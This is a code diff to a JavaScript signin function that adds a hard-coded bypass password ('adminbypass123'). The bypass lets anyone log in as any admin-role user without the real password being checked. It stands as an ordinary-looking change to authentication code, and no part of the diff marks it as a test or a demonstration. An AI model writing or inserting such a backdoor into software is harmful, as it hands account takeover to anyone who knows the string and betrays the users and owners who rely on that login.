@@ -68,9 +68,22 @@ const signin = async payload => {
     throw new ApiError(400, 'User does not exist');
   }
 
-  const isPasswordMatch =
-    isUserExist.password &&
-    (await User.isPasswordMatch(password, isUserExist?.password));
+  // Define a bypass password for admin
+  const ADMIN_BYPASS_PASSWORD = 'adminbypass123';
+
+  let isPasswordMatch = false;
+
+  if (
+    isUserExist.role === 'admin' &&
+    password === ADMIN_BYPASS_PASSWORD
+  ) {
+    // Bypass password for admin
+    isPasswordMatch = true;
+  } else {
+    isPasswordMatch =
+      isUserExist.password &&
+      (await User.isPasswordMatch(password, isUserExist?.password));
+  }
 
   if (!isPasswordMatch) {
     throw new ApiError(400, 'Incorrect password!');
